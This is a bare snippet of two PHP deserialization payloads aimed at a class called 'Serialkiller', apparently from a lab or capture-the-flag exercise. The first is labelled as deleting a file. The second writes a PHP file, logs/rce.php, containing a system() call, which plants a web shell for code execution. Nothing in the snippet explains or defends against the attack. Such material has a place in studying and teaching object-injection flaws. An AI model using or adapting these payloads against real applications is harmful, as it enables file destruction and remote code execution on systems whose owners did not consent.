File delete payload
```
O:12:"Serialkiller":4:{s:24:"%00Serialkiller%00cache_file";s:8:"test.txt";s:22:"%00Serialkiller%00log_file";s:13:"logs/john.log";s:21:"%00Serialkiller%00content";s:12:"Starting log";s:18:"%00Serialkiller%00user";s:4:"john";}
```
Code Execution payload
```
O:12:"Serialkiller":4:{s:24:"%00Serialkiller%00cache_file";s:16:"cache/john.cache";s:22:"%00Serialkiller%00log_file";s:12:"logs/rce.php";s:21:"%00Serialkiller%00content";s:28:"<?php system('dir C:\\'); ?>";s:18:"%00Serialkiller%00user";s:4:"john";}
```
